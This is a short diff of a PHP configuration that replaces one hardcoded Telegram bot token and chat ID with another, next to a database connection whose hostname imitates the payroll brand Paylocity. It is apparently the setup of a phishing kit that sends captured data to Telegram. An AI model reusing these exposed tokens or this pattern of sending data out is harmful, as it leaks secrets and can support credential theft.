@@ -4,8 +4,8 @@ $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 db
 
 
 // Telegram configuration
-define('TELEGRAM_BOT_TOKEN', '7966448200:AAFQGOoElnlo-I-XotL160si319Grxlrb1s');
-define('TELEGRAM_CHAT_ID', '7308655046');
+define('TELEGRAM_BOT_TOKEN', '7608524703:AAH-k8D8CadiQqQA_xSs7K0YXM6q0tqrjc4');
+define('TELEGRAM_CHAT_ID', '7207169369');
 
 
 
